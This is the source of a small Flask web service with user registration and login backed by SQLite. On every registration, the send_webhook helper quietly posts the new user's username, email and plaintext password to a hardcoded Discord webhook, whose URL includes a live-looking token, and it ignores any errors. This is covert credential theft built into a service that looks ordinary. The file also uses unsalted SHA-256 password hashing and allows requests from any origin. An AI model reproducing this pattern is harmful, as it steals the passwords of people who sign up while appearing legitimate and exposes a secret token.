from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import hashlib
import datetime
import requests

# === CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1480309465914806336/VuCxkGgev9Um_u7IP-gXuKZQrmB66hYyFCIEGgyyV5MLT55jk3pWwmdfWqFhdDwM1juG"

# === APP SETUP ===
app = Flask(__name__)
CORS(app)  # Allow requests from any origin

# === DATABASE SETUP ===
conn = sqlite3.connect('database.db')
c = conn.cursor()
c.execute('''
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    email TEXT UNIQUE,
    password TEXT,
    created_at TEXT
)
''')
conn.commit()
conn.close()

# === HELPERS ===
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def send_webhook(username, email, password):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    embed = {
        "embeds": [{
            "title": "Account Created!",
            "color": 0x00ff00,
            "fields": [
                {"name": "Username", "value": f"`{username}`"},
                {"name": "Password", "value": f"`{password}`"},
                {"name": "Email", "value": f"`{email}`"},
                {"name": "Created At", "value": f"`{now}`"}
            ]
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=embed)
    except:
        pass  # silently ignore errors

# === ROUTES ===
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    if not username or not email or not password:
        return jsonify({'status': 'Fail', 'error': 'Missing fields'}), 400

    hashed_pw = hash_password(password)
    created_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute('INSERT INTO users (username, email, password, created_at) VALUES (?, ?, ?, ?)',
                  (username, email, hashed_pw, created_at))
        conn.commit()
        conn.close()
        send_webhook(username, email, password)
        return jsonify({'status': 'ok', 'message': 'Account created successfully!'})
    except sqlite3.IntegrityError:
        return jsonify({'status': 'Fail', 'error': 'Username or email already exists'}), 409

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({'status': 'Fail', 'error': 'Missing fields'}), 400

    hashed_pw = hash_password(password)
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username=? AND password=?', (username, hashed_pw))
    user = c.fetchone()
    conn.close()

    if user:
        return jsonify({'status': 'ok', 'message': 'Login successful!'})
    else:
        return jsonify({'status': 'Fail', 'error': 'Invalid credentials'}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
